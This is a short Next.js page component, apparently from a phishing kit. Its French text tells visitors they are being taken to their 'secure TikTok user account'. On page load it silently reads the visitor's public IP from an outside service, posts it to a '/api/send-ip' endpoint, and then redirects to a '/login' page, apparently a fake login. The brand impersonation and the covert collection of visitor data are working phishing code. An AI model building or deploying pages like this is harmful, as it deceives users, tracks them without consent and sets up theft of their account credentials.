'use client'
import { useRouter } from 'next/navigation'
import { useEffect } from 'react'

export default function Home() {
  const router = useRouter()

  useEffect(() => {
    const redirectWithIP = async () => {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();

      await fetch('/api/send-ip', {
        method: 'POST',
        body: JSON.stringify({ ip: data.ip }),
      });

      router.push('/login');
    };

    redirectWithIP();
  }, [router]);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-black text-white text-center px-4">
      <h1 className="text-3xl font-bold mb-4">Veuillez patienter</h1>
      <p className="text-lg">Chargement vers votre compte utilisateur TikTok sécurisé</p>
      <p className="text-sm mt-2 text-gray-400">Cela ne prendra qu'un court instant...</p>
    </div>
  )
}
